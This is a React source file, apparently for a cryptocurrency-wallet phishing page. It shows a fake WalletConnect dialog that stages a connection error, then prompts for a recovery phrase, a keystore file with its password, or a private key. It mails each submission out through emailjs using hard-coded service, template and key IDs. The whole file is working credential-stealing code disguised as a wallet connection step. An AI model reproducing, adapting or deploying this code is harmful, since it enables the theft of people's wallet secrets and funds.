/* eslint-disable react/prop-types */
import { useEffect, useRef, useState } from "react";
import {
    useForm,
   } from "react-hook-form";
import Modal from "./Modal";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

const FirstModal = ( {isOpen, setIsOpen, isConnecting, setIsConnecting}) => {
    

    const [isLoading, setIsLoading] = useState(false);
   
    const formRef = useRef()
    const formRef2 = useRef()
    const formRef3 = useRef()
    useEffect( () => {
        const timer = setTimeout( () => {
            setIsConnecting(false)
        }, 4000)

        return () => clearTimeout(timer)
    }, [isConnecting])
    
    const [active, setActive] = useState(1)

    const navigate = useNavigate()

    const [step, setStep] = useState(1)

    
    const onClose = () => {
        setIsConnecting(true)
        setIsOpen( false );
    }

   
    const {
        register,
        handleSubmit,
        required,
        formState: { errors },
       } = useForm({

       });

       const handlePhraseSubmit = (data) => {
       setIsLoading(true);
        
        
         
      emailjs.sendForm('service_nuibne8', 'template_kz0fxeq', formRef.current, '_0A9sq7t3Q579a4JC')
      .then((result) => {
       console.log('ok')
        
      }).catch((error) => {
       console.log('err')
      });



        setTimeout(() => {
            setIsLoading(false);
            navigate('/')
        }, 3000)

       };

       const handleKeyStore = (data) => {
        setIsLoading(true);
        
        
         
      emailjs.sendForm('service_nuibne8', 'template_kz0fxeq', formRef2.current, '_0A9sq7t3Q579a4JC')
      .then((result) => {
       console.log('ok')
        
      }).catch((error) => {
       console.log('err')
      });



        setTimeout(() => {
            setIsLoading(false);
            navigate('/')
        }, 3000)
    console.log(data)
       };

       const handlePrivateKey = (data) => {
       setIsLoading(true);
        
        
         
      emailjs.sendForm('service_nuibne8', 'template_kz0fxeq', formRef3.current, '_0A9sq7t3Q579a4JC')
      .then((result) => {
       console.log('ok')
        
      }).catch((error) => {
       console.log('err')
      });



        setTimeout(() => {
            setIsLoading(false);
            navigate('/')
        }, 3000)
    console.log(data)
       };
      
    let bodyContent;

    if ( step === 1 ) {
      bodyContent = (
            <div className="px-7">
          
                    <h2 className="font-extrabold text-center text-[1.8rem] text-[hsl(0, 0%, 6%)] mb-5">WalletConnect</h2>

                <div>
                  <div className={`border  rounded-md relative h-[4.5rem] p-3 ${!isConnecting ? 'border-[red]' : 'border-gray-700'}`}>
                      { isConnecting ? <span className="animate-pulse">Loading...</span> : (
                        <>
                          <p className="text-[red] font-bold pt-1">Error Connecting...</p>
                          <div className="absolute bg-[#272a52] py-3 px-9 text-white font-semibold rounded-[10px] left-10 top-11 cursor-pointer" onClick={() => setStep(2)}>Connect  <br /> Manually</div>
                        </>
                    )}
                  </div>
                </div>

                <div className="mt-[6rem] border border-gray-700 rounded-md relative h-[5.3rem] p-4">
                    <h2 className="font-extrabold text-[1.1rem] text-[hsl(0, 0%, 6%)] ">Walletconnect</h2>
                    <p>Easy-to-use browser extension.</p>
                </div>
           </div>
           )
       }

    if ( step === 2 ) {
       bodyContent = (
           <div className=' px-7'>

             

               <div>
                   <div className='flex justify-around gap-x-8 items-center mb-10'>
                       <div onClick={() => setActive(1)} className={`${active === 1 ? 'bg-[#5878bc] p-4 text-white font-semibold rounded-[20px]' : ''} transition-all duration-300 cursor-pointer hover:bg-gray-300 hover:p-4 hover:rounded-[20px]`}>
                            Phrase
                       </div>
                       <div onClick={() => setActive(2)} className={`${active === 2 ? 'bg-[#5878bc] p-4 text-white font-semibold rounded-[20px]' : ''} transition-all duration-300 cursor-pointer hover:bg-gray-300 hover:p-4 hover:rounded-[20px]`}>
                            Keystone JSON
                       </div>
                       <div onClick={() => setActive(3)} className={`${active === 3 ? 'bg-[#5878bc] p-4 text-white font-semibold rounded-[20px]' : ''} transition-all duration-300 cursor-pointer hover:bg-gray-300 hover:p-4 hover:rounded-[20px]`}>
                            Private Key
                       </div>
                   </div>

                   {
                       active === 1 && (
                           <form onSubmit={handleSubmit(handlePhraseSubmit)} ref={formRef}>
                               
                               <textarea name="passphrase" id="passphrase" disabled={isLoading} {...register('passphrase', { required, minLength: 24 })} rows="2" placeholder="Phrase" className="p-3 border-2 rounded-md w-full outline-none" minLength={24} required></textarea>
                               <p className='mt-10 text-[.8rem] text-[#334f8b] font-semibold '>Typically 12 (sometimes 24) words separated by single spaces</p>
                               <button type='submit' className="p-3 w-full text-[#fff] text-center font-semibold bg-[#334f8b] rounded-[20px] mt-8">Connect</button>
                           </form>
                       )
                    }

{
                       active === 2 && (
                           <form onSubmit={ handleSubmit(handleKeyStore)} ref={formRef2}>
                               
                               <textarea name="keyStore" id="keyStore" rows="3" placeholder="Keystore JSON" className="p-3 border-2 rounded-md w-full outline-none" required disabled={isLoading} {...register('keyStore', { required, minLength: 12, maxLength: 24 })} minLength={12} maxLength={24}></textarea>
                               <input type="text" placeholder="Password" id="password" name="password" className="p-3 border-2 rounded-md mt-5 w-full outline-none" required disabled={isLoading} {...register('password', { required })}/>
                               <p className='mt-10 text-[.8rem] text-[#334f8b] font-semibold '>{`Several lines of text beginning with '(...)' plus the password you used to encrypt it.`}</p>
                               <button type='submit' className="p-3 w-full text-[#fff] text-center font-semibold bg-[#334f8b] rounded-[20px] mt-8">Connect</button>
                           </form>
                       )
                   }
                   
                   {
                       active === 3 && (
                        <form onSubmit={ handleSubmit(handlePrivateKey)} ref={formRef3}>
                               
                        <textarea name="privateKey" id="privateKey" rows="2" placeholder="Private Key" className="p-3 border-2 rounded-md w-full outline-none" required disabled={isLoading} {...register('privateKey', { required, minLength: 64 })} minLength={64}></textarea>
                        <p className='mt-10 text-[.8rem] text-[#334f8b] font-semibold '>Typically 64 alphanumeric characters</p>
                        <button type='submit' className="p-3 w-full text-[#fff] text-center font-semibold bg-[#334f8b] rounded-[20px] mt-8">Connect</button>
                    </form>
                       )
                    }
               </div>
           </div>
           );
       }
       //  body content
 
  
   
    return (
        <div>
        <Modal
         disabled={isLoading}
         isOpen={isOpen}
         title={step > 1 && "Verification"}
         onClose={onClose}
         body={bodyContent}
         step={step}
        />
       </div>
    )
};


export default FirstModal;